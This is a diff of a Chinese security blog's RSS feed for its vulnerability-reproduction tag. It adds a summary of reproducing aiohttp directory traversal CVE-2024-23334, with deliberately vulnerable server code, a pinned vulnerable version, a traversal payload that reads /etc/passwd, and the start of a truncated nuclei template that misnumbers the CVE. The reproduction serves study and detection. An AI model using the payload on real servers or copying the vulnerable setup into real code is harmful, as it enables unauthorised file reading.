@@ -4,7 +4,20 @@
         <link>https://ev1l0o4g.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
         <description>漏洞复现 - 标签 - ev1l0o4g&#39;s blog</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>ev1l0o4g@gmail.com (ev1l0o4g)</managingEditor>
-            <webMaster>ev1l0o4g@gmail.com (ev1l0o4g)</webMaster><lastBuildDate>Mon, 28 Aug 2023 15:43:55 &#43;0800</lastBuildDate><atom:link href="https://ev1l0o4g.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>ev1l0o4g@gmail.com (ev1l0o4g)</webMaster><lastBuildDate>Wed, 28 Feb 2024 10:22:00 &#43;0800</lastBuildDate><atom:link href="https://ev1l0o4g.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="self" type="application/rss+xml" /><item>
+    <title>Aiohttp目录穿越(CVE-2024-23334)复现</title>
+    <link>https://ev1l0o4g.xyz/aiohttp%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8Acve-2024-23334%E5%A4%8D%E7%8E%B0/</link>
+    <pubDate>Wed, 28 Feb 2024 10:22:00 &#43;0800</pubDate>
+    <author>ev1l0o4g</author>
+    <guid>https://ev1l0o4g.xyz/aiohttp%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8Acve-2024-23334%E5%A4%8D%E7%8E%B0/</guid>
+    <description><![CDATA[漏洞详情 aiohttp是一个用于asyncio和Python的异步HTTP客户端/服务器框架。当使用aiohttp作为web服务器并配置静态路由时，有必要指定静态文件的根路径。此外，选项follow_symlinks可用于确定是否遵循静态根目录之外的符号链接。当follow_symlinks设置为True时，不需要验证读取文件是否在根目录中。这可能导致目录遍历漏洞，导致未经授权访问系统上的任意文件，即使不存在符号链接。
+环境搭建与复现 Linux新建static目录和test.py文件，存在漏洞的代码：
+1 2 3 4 5 6 7 8 9 10 11 12 13 from aiohttp import web async def index(request): return web.Response(text=&#34;Hello, World!&#34;) app = web.Application() app.router.add_routes([ web.static(&#34;/static&#34;, &#34;static/&#34;, follow_symlinks=True), ]) app.router.add_get(&#39;/&#39;, index) if __name__ == &#39;__main__&#39;: web.run_app(app) 安装aiohttp3.9.1:pip3 install aiohttp==3.9.1
+payload:/static/../../../../../etc/passwd，需要针对../进行模糊测试
+nuclei-template:
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 id: aiohttp-lfi info: name: aiohttp-lfi author: dukodvco severity: medium description: CVE-2024-33334 reference: - https://github.]]></description>
+</item>
+<item>
     <title>WinRAR代码执行漏洞CVE 2023 38831复现</title>
     <link>https://ev1l0o4g.xyz/winrar%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-38831%E5%A4%8D%E7%8E%B0/</link>
     <pubDate>Mon, 28 Aug 2023 15:43:55 &#43;0800</pubDate>
